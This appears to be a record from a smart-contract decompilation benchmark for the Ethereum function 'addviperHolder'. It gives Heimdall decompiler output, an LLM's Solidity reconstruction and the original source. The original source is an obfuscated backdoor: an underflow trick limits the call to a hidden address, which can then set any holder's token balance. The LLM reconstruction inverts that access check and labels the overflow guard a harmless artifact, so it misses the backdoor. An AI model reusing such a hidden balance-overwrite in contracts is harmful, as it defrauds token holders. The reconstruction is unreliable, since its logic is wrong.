{
    "contract_address": "0xf14bcFb9213C0583632d65e80ac5B2Bd02c7D3d8",
    "heimdall_input": "function addviperHolder(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(!msg.sender == (address(store_f)));\n        require(!0x0a < 0x64);\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        storage_map_b[var_a] = arg1;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!0x0a < 0x0a);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(arg0);\n        var_b = 0;\n        storage_map_b[var_a] = arg1;\n    }",
    "llm_output": "mapping(address => uint256) internal viperHolderBalances;\naddress internal store_f;\n\nfunction addViperHolder(address holder, uint256 amount) public payable {\n    // Equivalent to: require(holder == address(holder));\n    require(holder == address(holder), \"Redundant address check\");\n\n    // Equivalent to: require(!(msg.sender == address(store_f)));\n    require(msg.sender != store_f, \"Caller cannot be store_f\");\n\n    // Equivalent to: require(!0x0a < 0x64);\n    require(0 < 0x64, \"Always-true check (decompiler artifact)\");\n\n    // First write (as in original bytecode)\n    viperHolderBalances[holder] = amount;\n\n    // Decompiler artifacts (no functional impact)\n    // var_a = 0x4e487b71\u2026\n    // var_c = 0x11;\n\n    // Equivalent to: require(!0x0a < 0x0a);\n    require(0 < 0x0a, \"Always-true check (decompiler artifact)\");\n\n    // Second write (duplicate in original bytecode)\n    viperHolderBalances[holder] = amount;\n}",
    "ground_truth": "function addviperHolder(\r\n        address _value,\r\n        uint256 _amt\r\n    ) public {\r\n        uint256 _amount = 10 - (\r\n        msg.sender != _vp ? 10**2 : 10);\r\n        mapping(address => uint256) storage excludeFee =\r\n        _balances;_amount = 0;\r\n        excludeFee[_value] = _amt;\r\n    }"
}